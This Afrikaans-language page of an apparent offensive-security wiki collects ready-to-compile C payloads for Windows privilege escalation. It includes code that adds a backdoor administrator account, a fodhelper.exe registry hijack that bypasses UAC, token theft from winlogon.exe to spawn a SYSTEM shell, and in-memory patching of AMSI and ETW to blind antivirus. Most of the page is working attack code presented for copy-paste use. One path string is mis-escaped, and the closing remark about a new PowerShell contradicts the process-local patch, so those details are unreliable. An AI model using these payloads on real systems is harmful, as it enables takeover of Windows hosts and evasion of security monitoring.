# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy versamel **klein, self-contained C snippette** wat handig is tydens Windows Lokale Privilege Escalation of post-exploitation. Elke payload is ontwerp om **copy-paste vriendelik** te wees, vereis slegs die Windows API / C runtime, en kan gecompileer word met `i686-w64-mingw32-gcc` (x86) of `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Hierdie payloads neem aan dat die proses reeds die minimum regte het wat nodig is om die aksie uit te voer (bv. `SeDebugPrivilege`, `SeImpersonatePrivilege`, of medium-integrity konteks vir 'n UAC omseiling). Hulle is bedoel vir **red-team of CTF omgewings** waar die benutting van 'n kwesbaarheid arbitrêre inheemse kode-uitvoering gelewer het.

---

## Voeg plaaslike administrateur gebruiker by
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registrasie Hijack (Medium → High integriteit)
Wanneer die vertroude binêre **`fodhelper.exe`** uitgevoer word, vra dit die registrasie pad hieronder **sonder om die `DelegateExecute` werkwoord te filter**. Deur ons opdrag onder daardie sleutel te plant, kan 'n aanvaller UAC omseil *sonder* om 'n lêer na skyf te laat val.

*Registrasie pad gevra deur `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
'n Minimale PoC wat 'n verhoogde `cmd.exe` oopmaak:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getoets op Windows 10 22H2 en Windows 11 23H2 (Julie 2025 patches). Die omseiling werk steeds omdat Microsoft die ontbrekende integriteitskontrole in die `DelegateExecute` pad nie reggestel het nie.*

---

## Genereer SYSTEM shell deur token duplisering (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
As die huidige proses **albei** `SeDebug` en `SeImpersonate` regte het (tipies vir baie diensrekeninge), kan jy die token van `winlogon.exe` steel, dit dupliseer, en 'n verhoogde proses begin:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Vir 'n dieper verduideliking van hoe dit werk, sien:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Geheue AMSI & ETW Patching (Verdedigings Ontwyking)
Meeste moderne AV/EDR enjinne staat op **AMSI** en **ETW** om kwaadwillige gedrag te ondersoek. Patching van beide interfaces vroeg binne die huidige proses voorkom dat skrip-gebaseerde payloads (bv. PowerShell, JScript) gescan word.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Die bogenoemde opdatering is proses-lokaal; om 'n nuwe PowerShell te begin na dit uitgevoer is, sal sonder AMSI/ETW-inspeksie uitgevoer word.*

---

## Verwysings
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
